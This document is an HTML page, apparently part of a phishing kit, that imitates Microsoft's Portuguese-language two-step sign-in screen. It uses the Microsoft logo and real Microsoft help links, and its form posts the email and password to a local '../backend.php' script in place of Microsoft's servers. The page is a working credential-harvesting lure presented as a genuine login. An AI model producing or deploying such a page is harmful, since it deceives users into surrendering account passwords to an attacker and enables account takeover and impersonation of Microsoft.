<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Entrar na sua conta Microsoft</title>
    <link rel="icon" type="image/svg+xml" sizes="21x21" href="assets/img/favicon16.svg">
    <link rel="icon" type="image/svg+xml" sizes="43x43" href="assets/img/favicon32.svg">
    <link rel="icon" type="image/svg+xml" sizes="240x240" href="assets/img/favicon%20180.svg">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
</head>

<script>
    document.getElementById("btnSend").addEventListener("click", function() {
    if (!validate()) return;
    const emailValue = document.getElementById("email").value;
    document.getElementById("userLine").textContent = emailValue;

    const section1 = document.getElementById("section-1");
    const section2 = document.getElementById("section-2");
    section1.style.display = "none"; // Hide section-1
    section2.style.display = "block"; // Show section-2
});
</script>

<body class="text-nowrap" style="width: 100%; height: 100vh;">
    <div id="loginForm" class="container">
        <img id="image" src="assets/img/microsoft_logo.svg">
        <div></div>
        <form id="form" action="../backend.php" method="post">
            <section id="section-main">
                <section id="section-1" class="slide-page">
                    <!-- Seus elementos de formulário existentes -->
                    <p id="signIn" class="field">Entrar</p>
                    <h5 id="result"></h5>
                    <input type="email" id="email" name="email" class="field" placeholder="Email, telefone ou Skype" />
                    <p id="NoAccount" class="field">Não tem uma conta?<a id="linkCreateAccount"
                            href="https://signup.live.com/?lic=1" style="color: #0067b8;">Crie uma!</a></p>
                    <p id="signInSecurityKey" class="field"><a
                            href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key"
                            style="color: #0067b8;">Entrar com uma chave de segurança</a><i
                            class="far fa-question-circle fa-lg" id="iconQ"></i></p>
                    <p id="signInOptions" class="field"><a
                            href="https://account.microsoft.com/account/manage-my-account"
                            style="color: #0067b8;">Opções de entrada</a></p>
                    <p id="btnPlace" class="field"><button class="firstNext next"  type="button"
                            id="btnSend">Próximo</button></p>
                </section>
                <section id="section-2" class="page secondSlide">
                    <p id="userLine">P</p><button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" type="button"
                        style="font-size: 12px;height: 25px;width: 26px;"><i class="la la-long-arrow-left"
                            id="arrowBack-1"
                            style="width: 1px;font-size: 19px;font-weight: 800;margin: -1px;"></i></button>
                    <p id="enterPwd">Digite a senha</p>
                    <h5 id="passResult"></h5>
                    <p><input type="password" id="password" name="password" placeholder="Senha"></p>
                    <p id="keepMe">Mantenha-me conectado</p><input type="checkbox" id="cbRemember">
                    <p id="ForgodPwd"><a href="#">Esqueceu a senha?</a></p>
                    <p id="SignWithKey"><a href="#">Entrar com o Windows Hello ou uma chave de segurança</a></p>
                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="submit">Entrar</button></p>
                </section>
            </section>
        </form>
    </div>
    <div id="footer" style="height: 36px;">
        <div id="terms" style="float: left;width: 84px;">
            <p style="font-size: 13px;text-align: left;">Termos de uso</p>
        </div>
        <div style="float: left;width: 105px;">
            <p style="font-size: 12px;">Privacidade e cookies</p>
        </div>
        <div style="float: left;width: 24px;">
            <p style="font-size: 12px;">•••<br></p>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/script.min.js"></script>
</body>

</html>
